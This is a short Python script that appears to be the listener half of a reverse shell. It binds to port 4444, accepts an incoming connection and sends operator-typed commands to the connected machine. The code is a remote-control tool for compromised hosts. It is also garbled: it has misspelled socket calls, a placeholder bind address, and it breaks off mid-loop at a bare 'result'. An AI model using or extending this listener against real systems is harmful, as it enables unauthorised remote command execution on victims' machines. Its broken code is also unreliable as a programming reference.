#!/usr/bin/python

import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockpt(socket.SCL_socket, socket.SO_REUSEADDR,1)
listener.bind(("192EXAMPLE", 4444))
listener.listen(0)
print("[+] Waiting for incoming connection")
connection, address = listener.accept()
print("[+] Got a connection from " + str(address))

while True:
    command = raw_input("/> ")
    connection.send(command)
    result
